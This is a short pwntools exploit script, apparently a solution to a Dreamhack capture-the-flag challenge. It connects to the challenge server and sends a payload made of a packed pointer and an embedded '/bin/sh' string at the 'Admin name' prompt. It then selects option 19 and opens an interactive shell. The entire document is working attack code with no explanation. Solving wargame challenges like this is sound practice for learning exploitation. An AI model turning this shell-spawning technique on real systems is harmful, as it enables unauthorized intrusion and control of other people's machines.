from pwn import *

# Must be updated
p = remote("host3.dreamhack.games", 21731)

name = 0x804a0ac
payload = p32(name + 0x4)
payload += b'/bin/sh'
p.sendlineafter(b'Admin name: ', payload)
p.sendlineafter(b'want?: ', b'19')

p.interactive()
